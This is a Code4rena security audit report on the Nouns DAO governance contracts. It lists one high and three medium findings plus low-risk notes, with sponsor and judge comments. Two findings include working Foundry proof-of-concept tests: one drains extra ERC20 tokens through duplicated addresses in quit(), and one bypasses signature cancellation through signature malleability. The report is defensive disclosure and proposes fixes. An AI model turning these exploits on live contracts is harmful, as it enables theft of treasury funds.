---
sponsor: "Nouns DAO"
slug: "2023-07-nounsdao"
date: "2023-07-31"
title: "Nouns DAO"
findings: "https://github.com/code-423n4/2023-07-nounsdao-findings/issues"
contest: 257
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Nouns DAO smart contract system written in Solidity. The audit took place between July 3—July 13 2023.

## Wardens

36 Wardens contributed reports to the Nouns DAO:

  1. 0xA5DF
  2. [0xAnah](https://twitter.com/0xAnah)
  3. 0xG0P1
  4. [0xMilenov](https://twitter.com/0xMilenov)
  5. [0xSmartContract](https://twitter.com/0xSmartContract)
  6. [0xnev](https://twitter.com/0xnevi)
  7. [Aymen0909](https://github.com/Aymen1001)
  8. [Bauchibred](https://twitter.com/bauchibred?s&#x3D;21&amp;t&#x3D;7sv-1qcnwtkdTA81Iog0yQ )
  9. [Emmanuel](https://twitter.com/emeduduna)
  10. [JCN](https://twitter.com/0xJCN)
  11. [K42](https://twitter.com/CrystAlline_K42)
  12. [Kaysoft](https://www.linkedin.com/in/kayode-okunlade-862001142/)
  13. Matin
  14. MohammedRizwan
  15. Raihan
  16. SAQ
  17. SM3\_SS
  18. [c3phas](https://twitter.com/c3ph_)
  19. cccz
  20. codegpt
  21. descharre
  22. [dharma09](https://twitter.com/im_Dharma09)
  23. [fatherOfBlocks](https://twitter.com/father0fBl0cks)
  24. flutter\_developer
  25. [hunter\_w3b](https://twitter.com/hunt3r_w3b)
  26. iglyx
  27. [ihtishamsudo](https://twitter.com/ihtishamSudo)
  28. jasonxiale
  29. klau5
  30. koxuan
  31. kutugu
  32. [nadin](https://twitter.com/nadin20678790)
  33. [naman1778](https://www.linkedin.com/in/naman-agrawal1778/)
  34. petrichor
  35. said
  36. shark

This audit was judged by [gzeon](https://twitter.com/gzeon).

Final report assembled by [liveactionllama](https://twitter.com/liveactionllama).

# Summary

The C4 analysis yielded an aggregated total of 4 unique vulnerabilities. Of these vulnerabilities, 1 received a risk rating in the category of HIGH severity and 3 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 14 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 15 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Nouns DAO repository](https://github.com/code-423n4/2023-07-nounsdao), and is composed of 33 smart contracts written in the Solidity programming language and includes 9,098 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (1)
## [[H-01] User can steal tokens by using duplicated ERC20 tokens as parameter in `NounsDAOLogicV1Fork.quit`](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/102)
*Submitted by [jasonxiale](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/102), also found by [iglyx](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/257), [0xA5DF](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/180), [said](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/123), [shark](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/90), and [0xG0P1](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/51)*

Calling [NounsDAOLogicV1Fork.quit](https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L206-L216) by using dupliated ERC20 tokens, malicious user can gain more ERC20 tokens than he/she is supposed to, even drain all ERC20 tokens.

### Proof of Concept

In function, [NounsDAOLogicV1Fork.quit](https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L206-L216), `erc20TokensToInclude` is used to specified tokens a user wants to get, but since the function doesn't verify if `erc20TokensToInclude` contains dupliated tokens, it's possible that a malicious user calls the function by specify the ERC20 more than once to get more share tokens.

```solidity
    function quit(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) external nonReentrant {
        // check that erc20TokensToInclude is a subset of `erc20TokensToIncludeInQuit`
        address[] memory erc20TokensToIncludeInQuit_ = erc20TokensToIncludeInQuit;
        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {
            if (!isAddressIn(erc20TokensToInclude[i], erc20TokensToIncludeInQuit_)) {
                revert TokensMustBeASubsetOfWhitelistedTokens();
            }
        }

        quitInternal(tokenIds, erc20TokensToInclude);
    }

    function quitInternal(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) internal {
        checkGovernanceActive();

        uint256 totalSupply = adjustedTotalSupply();

        for (uint256 i = 0; i < tokenIds.length; i++) {
            nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]);
        }

        uint256[] memory balancesToSend = new uint256[](erc20TokensToInclude.length);

        // Capture balances to send before actually sending them, to avoid the risk of external calls changing balances.
        uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply;
        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {
            IERC20 erc20token = IERC20(erc20TokensToInclude[i]);
            balancesToSend[i] = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply;
        }

        // Send ETH and ERC20 tokens
        timelock.sendETH(payable(msg.sender), ethToSend);
        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {
            if (balancesToSend[i] > 0) {
                timelock.sendERC20(msg.sender, erc20TokensToInclude[i], balancesToSend[i]);
            }
        }

        emit Quit(msg.sender, tokenIds);
    }
```

Add the following code in test/foundry/governance/fork/NounsDAOLogicV1Fork.t.sol file `NounsDAOLogicV1Fork_Quit_Test` contract,
and run `forge test --ffi --mt test_quit_allowsChoosingErc20TokensToIncludeTwice`.

```solidity
    function test_quit_allowsChoosingErc20TokensToIncludeTwice() public {
        vm.prank(quitter);
        address[] memory tokensToInclude = new address[](3);
        //****************************
        // specify token2 three times
        //****************************
        tokensToInclude[0] = address(token2);
        tokensToInclude[1] = address(token2);
        tokensToInclude[2] = address(token2);
        dao.quit(quitterTokens, tokensToInclude);

        assertEq(quitter.balance, 24 ether);
        assertEq(token1.balanceOf(quitter), 0);
        //****************************
        // get 3 time tokens
        //****************************
        assertEq(token2.balanceOf(quitter), 3 * (TOKEN2_BALANCE * 2) / 10);
     }
```

### Tools Used

VS

### Recommended Mitigation Steps

By using function `checkForDuplicates` to prevent the issue

```diff
--- NounsDAOLogicV1Fork.sol	2023-07-12 21:32:56.925848531 +0800
+++ NounsDAOLogicV1ForkNew.sol	2023-07-12 21:32:34.006158294 +0800
@@ -203,8 +203,9 @@
         quitInternal(tokenIds, erc20TokensToIncludeInQuit);
     }
 
-    function quit(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) external nonReentrant {
+    function quit(uint256[] calldata tokenIds, address[] memory erc20tokenstoinclude) external nonReentrant {
         // check that erc20TokensToInclude is a subset of `erc20TokensToIncludeInQuit`
+        checkForDuplicates(erc20tokenstoinclude);
         address[] memory erc20TokensToIncludeInQuit_ = erc20TokensToIncludeInQuit;
         for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {
             if (!isAddressIn(erc20TokensToInclude[i], erc20TokensToIncludeInQuit_)) {

```

**[eladmallel (Nouns DAO) confirmed and commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/102#issuecomment-1644585861):**
 > Fix PR: https://github.com/nounsDAO/nouns-monorepo/pull/762

**[gzeon (judge) increased severity to High](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/102#issuecomment-1647519228)**



***

 
# Medium Risk Findings (3)
## [[M-01] `cancelSig` will not completely cancel signatures due to malleability vulnerabilities](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/198)
*Submitted by [kutugu](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/198)*

<https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Proposals.sol#L270-L275><br>
<https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Proposals.sol#L983>

The current version of openzeppelin contracts has a high risk of vulnerability about signature malleability attack: <https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3610>.

So if the signer only cancel one signature, the malicious proposer can still extend a fully valid signature through the previous signature to pass the proposal.

### Proof of Concept
<details>
 
```solidity
// CancelProposalBySigs.t.sol
contract TestSignatureMalleabilityAttack is ZeroState {
    function setUp() public virtual override {
        super.setUp();

        (signerWithVote, signerWithVotePK) = makeAddrAndKey('signerWithVote');

        vm.startPrank(minter);
        nounsToken.mint();
        nounsToken.transferFrom(minter, signerWithVote, 1);
        vm.roll(block.number + 1);
        vm.stopPrank();

        NounsDAOV3Proposals.ProposalTxs memory txs = makeTxs(makeAddr('target'), 0, '', '');
        uint256 expirationTimestamp = block.timestamp + 1234;
        NounsDAOStorageV3.ProposerSignature[] memory proposerSignatures = new NounsDAOStorageV3.ProposerSignature[](1);
        bytes memory signature = signProposal(proposer, signerWithVotePK, txs, 'description', expirationTimestamp, address(dao));
        vm.prank(signerWithVote);
        dao.cancelSig(signature);

        proposerSignatures[0] = NounsDAOStorageV3.ProposerSignature(
            signature,
            signerWithVote,
            expirationTimestamp
        );
        vm.expectRevert(abi.encodeWithSelector(NounsDAOV3Proposals.SignatureIsCancelled.selector));
        vm.prank(proposer);
        proposalId = dao.proposeBySigs(
            proposerSignatures,
            txs.targets,
            txs.values,
            txs.signatures,
            txs.calldatas,
            'description'
        );

        proposerSignatures[0] = NounsDAOStorageV3.ProposerSignature(
            to2098Format(signature),
            signerWithVote,
            expirationTimestamp
        );
        vm.prank(proposer);
        proposalId = dao.proposeBySigs(
            proposerSignatures,
            txs.targets,
            txs.values,
            txs.signatures,
            txs.calldatas,
            'description'
        );

        vm.roll(block.number + 1);

        assertEq(uint256(dao.state(proposalId)), uint256(NounsDAOStorageV3.ProposalState.Updatable));
    }

    // Copy from https://github.com/pcaversaccio/malleable-signatures/blob/1f618f556c0af48c44d27c7dbf1f97dc898ceda9/test/SignatureMalleability.t.sol#L78
    error InvalidSignatureLength();
    error InvalidSignatureSValue();
    function to2098Format(bytes memory signature) internal view returns (bytes memory) {
        if (signature.length != 65) revert InvalidSignatureLength();
        if (uint8(signature[32]) >> 7 == 1) revert InvalidSignatureSValue();
        bytes memory short = slice(signature, 0, 64);
        uint8 parityBit = uint8(short[32]) | ((uint8(signature[64]) % 27) << 7);
        short[32] = bytes1(parityBit);
        return short;
    }

    // Copy from https://github.com/GNSPS/solidity-bytes-utils/blob/6458fb2780a3092bc756e737f246be1de6d3d362/contracts/BytesLib.sol#L228
    function slice(
        bytes memory _bytes,
        uint256 _start,
        uint256 _length
    )
        internal
        pure
        returns (bytes memory)
    {
        require(_length + 31 >= _length, "slice_overflow");
        require(_bytes.length >= _start + _length, "slice_outOfBounds");

        bytes memory tempBytes;

        assembly {
            switch iszero(_length)
            case 0 {
                // Get a location of some free memory and store it in tempBytes as
                // Solidity does for memory variables.
                tempBytes := mload(0x40)

                // The first word of the slice result is potentially a partial
                // word read from the original array. To read it, we calculate
                // the length of that partial word and start copying that many
                // bytes into the array. The first word we copy will start with
                // data we don't care about, but the last `lengthmod` bytes will
                // land at the beginning of the contents of the new array. When
                // we're done copying, we overwrite the full first word with
                // the actual length of the slice.
                let lengthmod := and(_length, 31)

                // The multiplication in the next line is necessary
                // because when slicing multiples of 32 bytes (lengthmod == 0)
                // the following copy loop was copying the origin's length
                // and then ending prematurely not copying everything it should.
                let mc := add(add(tempBytes, lengthmod), mul(0x20, iszero(lengthmod)))
                let end := add(mc, _length)

                for {
                    // The multiplication in the next line has the same exact purpose
                    // as the one above.
                    let cc := add(add(add(_bytes, lengthmod), mul(0x20, iszero(lengthmod))), _start)
                } lt(mc, end) {
                    mc := add(mc, 0x20)
                    cc := add(cc, 0x20)
                } {
                    mstore(mc, mload(cc))
                }

                mstore(tempBytes, _length)

                //update free-memory pointer
                //allocating the array padded to 32 bytes like the compiler does now
                mstore(0x40, and(add(mc, 31), not(31)))
            }
            //if we want a zero-length slice let's just return a zero-length array
            default {
                tempBytes := mload(0x40)
                //zero out the 32 bytes slice we are about to return
                //we need to do it because Solidity does not garbage collect
                mstore(tempBytes, 0)

                mstore(0x40, add(tempBytes, 0x20))
            }
        }

        return tempBytes;
    }

    function testAttack() public {}
}
```

```shell
forge test --match-test testAttack -vvvv --ffi
```

</details>

### Tools Used

Foundry

### Recommended Mitigation Steps

Update openzeppelin contracts to the new version.

**[eladmallel (Nouns DAO) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/198#issuecomment-1644632754):**
 > Fix PR here: https://github.com/nounsDAO/nouns-monorepo/pull/761
> 
> However, think severity should not be high. The worst case here is a signature abuse leads to a proposal going on chain, still subject to the proposal lifecycle, including quorum and voting.

**[davidbrai (Nouns DAO) commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/198#issuecomment-1645332715):**
 > Another point regarding severity:<br>
> The signer can also move their tokens to another address as a way to make the previous signature not useful.

**[gzeon (judge) decreased severity to Low and commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/198#issuecomment-1647352618):**
 > Downgrading to Low since no asset will be at risk and require a user error.

**[gzeon (judge) increased severity to Medium and commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/198#issuecomment-1650631261):**
 > It is worth to note this is atypical in Code4rena judging, and should not be considered as a precedence for future contests. [Signature malleability](https://gist.github.com/CloudEllie/deb7d1c9c91b605555cbe604662e58cf#low5-use-of-ecrecover-is-susceptible-to-signature-malleability), or [outdated OZ dependency](https://gist.github.com/CloudEllie/deb7d1c9c91b605555cbe604662e58cf#low25-upgrade-openzeppelin-contract-dependency) are generally considered as out-of-scope in C4 contests as they are covered by the bot report. This report is special in the sense that while the project already used the recommended OZ ECDSA library, the specific version they used contained a bug that allow malleability, which the warden provided a POC with meaningful impact. I am keeping this as Medium risk for the above reason and sponsor opinion.



***

## [[M-02] If DAO updates `forkEscrow` before `forkThreshold` is reached, the user's escrowed Nouns will be lost](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/56)
*Submitted by [cccz](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/56)*

During the escrow period, users can escrow to or withdraw from forkEscrow their Nouns.

During the escrow period, proposals can be executed.

```solidity
    function withdrawFromForkEscrow(NounsDAOStorageV3.StorageV3 storage ds, uint256[] calldata tokenIds) external {
        if (isForkPeriodActive(ds)) revert ForkPeriodActive();

        INounsDAOForkEscrow forkEscrow = ds.forkEscrow;
        forkEscrow.returnTokensToOwner(msg.sender, tokenIds);

        emit WithdrawFromForkEscrow(forkEscrow.forkId(), msg.sender, tokenIds);
    }
```

Since withdrawFromForkEscrow will only call the returnTokensToOwner function of ds.forkEscrow, and returnTokensToOwner is only allowed to be called by DAO.

If, during the escrow period, ds.forkEscrow is changed by the proposal's call to \_setForkEscrow, then the user's escrowed Nouns will not be withdrawn by withdrawFromForkEscrow.

```solidity
    function returnTokensToOwner(address owner, uint256[] calldata tokenIds) external onlyDAO {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            if (currentOwnerOf(tokenIds[i]) != owner) revert NotOwner();

            nounsToken.transferFrom(address(this), owner, tokenIds[i]);
            escrowedTokensByForkId[forkId][tokenIds[i]] = address(0);
        }

        numTokensInEscrow -= tokenIds.length;
    }
```

Consider that some Nouners is voting on a proposal that would change ds.forkEscrow.<br>
There are some escrowed Nouns in forkEscrow (some Nouners may choose to always escrow their Nouns to avoid missing fork).<br>
The proposal is executed, ds.forkEscrow is updated, and the escrowed Nouns cannot be withdrawn.

### Proof of Concept

<https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/NounsDAOV3Fork.sol#L95-L102><br>
<https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/NounsDAOForkEscrow.sol#L116-L125><br>
<https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol#L527-L531>

### Recommended Mitigation Steps

Consider allowing the user to call forkEscrow\.returnTokensToOwner directly to withdraw escrowed Nouns, and need to move isForkPeriodActive from withdrawFromForkEscrow to returnTokensToOwner.

**[eladmallel (Nouns DAO) acknowledged](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/56#issuecomment-1650607685)**



***

## [[M-03] `NounsDAOV3Proposals.cancel()` should allow to cancel the proposal of the Expired state](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/55)
*Submitted by [cccz](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/55)*

cancel() does not allow to cancel proposals in the final states Canceled/Defeated/Expired/Executed/Vetoed.

```solidity
    function cancel(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId) external {
        NounsDAOStorageV3.ProposalState proposalState = stateInternal(ds, proposalId);
        if (
            proposalState == NounsDAOStorageV3.ProposalState.Canceled ||
            proposalState == NounsDAOStorageV3.ProposalState.Defeated ||
            proposalState == NounsDAOStorageV3.ProposalState.Expired ||
            proposalState == NounsDAOStorageV3.ProposalState.Executed ||
            proposalState == NounsDAOStorageV3.ProposalState.Vetoed
        ) {
            revert CantCancelProposalAtFinalState();
        }
```

The Canceled/Executed/Vetoed states are final because they cannot be changed once they are set.

The Defeated state is also a final state because no new votes will be cast (`stateInternal()` may return Defeated only if the `objectionPeriodEndBlock` is passed).

But the Expired state depends on the `GRACE_PERIOD` of the timelock, and `GRACE_PERIOD` may be changed due to upgrades. Once the `GRACE_PERIOD` of the timelock is changed, the state of the proposal may also be changed, so Expired is not the final state.

```solidity
        } else if (block.timestamp >= proposal.eta + getProposalTimelock(ds, proposal).GRACE_PERIOD()) {
            return NounsDAOStorageV3.ProposalState.Expired;
        } else {
            return NounsDAOStorageV3.ProposalState.Queued;
```

Consider the following scenario:

- Alice submits proposal A to stake 20,000 ETH to a DEFI protocol, and it is successfully passed, but it cannot be executed because there is now only 15,000 ETH in the timelock (consumed by other proposals), and then proposal A expires.
- The DEFI protocol has been hacked or rug-pulled.
- Now proposal B is about to be executed to upgrade the timelock and extend `GRACE_PERIOD` (e.g., `GRACE_PERIOD` is extended by 7 days from V1 to V2).
- Alice wants to cancel Proposal A, but it cannot be canceled because it is in Expired state.
- Proposal B is executed, causing Proposal A to change from Expired to Queued.
- The malicious user sends 5000 ETH to the timelock and immediately executes Proposal A to send 20000 ETH to the hacked protocol.

### Proof of Concept

<https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Proposals.sol#L571-L581>

### Recommended Mitigation Steps

Consider adding a proposal expiration time field in the Proposal structure.

```diff
    function queue(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId) external {
        require(
            stateInternal(ds, proposalId) == NounsDAOStorageV3.ProposalState.Succeeded,
            'NounsDAO::queue: proposal can only be queued if it is succeeded'
        );
        NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId];
        INounsDAOExecutor timelock = getProposalTimelock(ds, proposal);
        uint256 eta = block.timestamp + timelock.delay();
        for (uint256 i = 0; i < proposal.targets.length; i++) {
            queueOrRevertInternal(
                timelock,
                proposal.targets[i],
                proposal.values[i],
                proposal.signatures[i],
                proposal.calldatas[i],
                eta
            );
        }
        proposal.eta = eta;
+       proposal.exp = eta + timelock.GRACE_PERIOD();
...
-       } else if (block.timestamp >= proposal.eta + getProposalTimelock(ds, proposal).GRACE_PERIOD()) {
+       } else if (block.timestamp >= proposal.exp) {
            return NounsDAOStorageV3.ProposalState.Expired;
```

**[eladmallel (Nouns DAO) acknowledged and commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/55#issuecomment-1644570812):**
 > Agree, it's possible due to a change in executor's grace period to move from Expired back to Queued.<br>
> However, since a grace period change is a rare event, we think this is very low priority and we won't fix.

**[gzeon (judge) decreased severity to Low/Non-Critical](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/55#issuecomment-1650646474)**

**[eladmallel (Nouns DAO) commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/55#issuecomment-1650607865):**
 > We think it would be great to include this issue in the report (at medium severity).

**[gzeon (judge) commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/55#issuecomment-1650646474):**
 > @eladmallel - Changing the `GRACE_PERIOD` is an admin change, which besides misconfiguration is out-of-scope, it is as you described is a rare event. Having a malicious proposal which is passed that got expired is also a rare event. Having a changed `GRACE_PERIOD` that just long enough to make such a malicious proposal become queued is a very rare event, assuming governance is not completely compromised already.
> 
> That said, I am ok with this being Medium risk since this is clearly in scope + can be Medium risk with some assumption (tho extreme imo but is subjective), and I would recommend for a fix accordingly. Please let me know if that's what you want, thanks!

**[eladmallel (Nouns DAO) commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/55#issuecomment-1650792548):**
 > Thank you @gzeon.<br>
> We all agree the odds of the risk materializing is low, we just felt like this was a nice find, and honestly mostly motivated by wanting the warden who found this to have a win :)
> 
> It's not a deal breaker for us if it's in the report or not, just wanted to express our preference.
> 
> Thank you for sharing more of your thinking, it's helpful!

**[cccz (warden) commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/55#issuecomment-1650936160):**
 > Low Likelihood + High Severity is generally considered Medium, which is an edge case that fits the medium risk.<br>
> Another thing I would say is that the proposal doesn't need to be malicious, as I said in the attack scenario where the proposal is normal but expires due to inability to execute for other reasons ( contract balance insufficient, etc.).
> > *Changing the `GRACE_PERIOD` is an admin change, which besides misconfiguration is out-of-scope, it is as you described is a rare event. Having a malicious proposal which is passed that got expired is also a rare event. Having a changed `GRACE_PERIOD` that just long enough to make such a malicious proposal become queued is a very rare event, assuming governance is not completely compromised already.*

**[gzeon (judge) increased severity to Medium and commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/55#issuecomment-1651037458):**
 > @cccz - True, but this is also marginally out-of-scope since an admin action is required, and one may argue it is a misconfiguration if you increase `GRACE_PERIOD` so much that it revive some old passed buggy proposal. 
> 
> But given this is marginal and on sponsor's recommendation, I will upgrade this to Medium.



***

# Low Risk and Non-Critical Issues

For this audit, 12 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/124) by **shark** received the top score from the judge.

*The following wardens also submitted reports: [Kaysoft](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/261), [codegpt](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/240), [MohammedRizwan](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/220), [klau5](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/196), [nadin](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/145), [0xMilenov](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/131), [ihtishamsudo](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/109), [descharre](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/73), [fatherOfBlocks](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/57), [koxuan](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/52), and [Bauchibred](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/35).*

## [01] Reserve price not fully taken care of
It is possible for an active auction to close at a price lower than the newly increased reserve price. This is undesirable especially when preventing a Noun auctioned off at the lower than expected price could be out of control in a bear market. Consider adding a check alleging that the contract balance needing to exceed the reserve price. Else, the last bidder will be refunded prior to having the Noun burned. Here's a refactored code logic that will take care of the suggestion.

https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol#L236-L256

```solidity
/**
 * @notice Settle an auction, finalizing the bid and paying out to the owner.
 * @dev If there are no bids, the Noun is burned.
 */
function _settleAuction() internal {
    INounsAuctionHouse.Auction memory _auction = auction;

    require(_auction.startTime != 0, "Auction hasn't begun");
    require(!_auction.settled, 'Auction has already been settled');
    require(block.timestamp >= _auction.endTime, "Auction hasn't completed");

    auction.settled = true;

    // Check if contract balance is greater than reserve price
    if (address(this).balance < reservePrice) {
        // If contract balance is less than reserve price, refund to the last bidder
        if (_auction.bidder != address(0)) {
            _safeTransferETHWithFallback(_auction.bidder, _auction.amount);
        }

        // And then burn the Noun
        nouns.burn(_auction.nounId);
    } else {
        if (_auction.bidder == address(0)) {
            nouns.burn(_auction.nounId);
        } else {
            nouns.transferFrom(address(this), _auction.bidder, _auction.nounId);
        }

        if (_auction.amount > 0) {
            _safeTransferETHWithFallback(owner(), _auction.amount);
        }
    }

    emit AuctionSettled(_auction.nounId, _auction.bidder, _auction.amount);
}
```

## [02] Code and comment mismatch (V2 Only)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L86

```solidity
    @ audit 4,000 should be changed to 6,000
    uint256 public constant MAX_QUORUM_VOTES_BPS_UPPER_BOUND = 6_000; // 4,000 basis points or 60%
```

## [03] Spelling errors
There are numerous instances throughout the codebase in different contracts. Here's just one of the specific instances:  

https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L61

```solidity
    @ audit setable should be changed to settable
    /// @notice The minimum setable proposal threshold
```
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L218

```solidity
            @ audit arity should be changed to parity
            'NounsDAO::propose: proposal function information arity mismatch'
```
There are numerous instances throughout the codebase in different contracts. Here's just one of the specific instances:  

https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L901

```solidity
     @ audit priviledges should be changed to privileges
     * @notice Burns veto priviledges
```
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol#L19

```solidity
@ audit NounsDAOLogicV2.sol should be changed to NounsDAOLogicV3.sol
// NounsDAOLogicV2.sol is a modified version of Compound Lab's GovernorBravoDelegate.sol:
```
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol#L217

```solidity
    @ audit the during of should be omitted
    /// @notice Emitted when the during of the forking period is set
```
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/token/base/ERC721CheckpointableUpgradeable.sol#L80-L84

```solidity
    @ audit thats should be changed to that's
    /// @notice An event thats emitted when an account changes its delegate
    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);

    @ audit thats should be changed to that's
    /// @notice An event thats emitted when a delegate account's vote balance changes
    event DelegateVotesChanged(address indexed delegate, uint256 previousBalance, uint256 newBalance);
```

## [04] Wrong adoption of block time (V2 Only)
The following voting period constants are assuming 9.6 instead of 12 seconds per block. Depending on the sensitivity of lower and upper ranges desired, these may limit or shift the intended settable voting periods. For instance, using the supposed 12 second per block convention, the minimum and maximum settable voting periods should respectively be `7_200` and `100_800`. 

https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L67-L71

```solidity
    /// @notice The minimum setable voting period
    uint256 public constant MIN_VOTING_PERIOD = 5_760; // About 24 hours

    /// @notice The max setable voting period
    uint256 public constant MAX_VOTING_PERIOD = 80_640; // About 2 weeks
```

## [05] `MIN_PROPOSAL_THRESHOLD_BPS` is too low a value
In NounsDAOLogicV2.sol, NounsDAOV3Admin.sol, and NounsDAOLogicV1Fork.sol, the minimum proposal threshold can be set as low as 1 basis point.

https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L61-L62<br>
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol#L111-L112<br>
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L118-L119

```solidity
    /// @notice The minimum setable proposal threshold
    uint256 public constant MIN_PROPOSAL_THRESHOLD_BPS = 1; // 1 basis point or 0.01%
```
This could pose a precision issue even if the total supply of Nouns tokens is already in its three digits. Apparently, a proposal threshold determined via the following two functions could return zero, e.g. `(1 * 720) / 10000` yields zero due to truncation, i.e. the numerator smaller than the denominator.

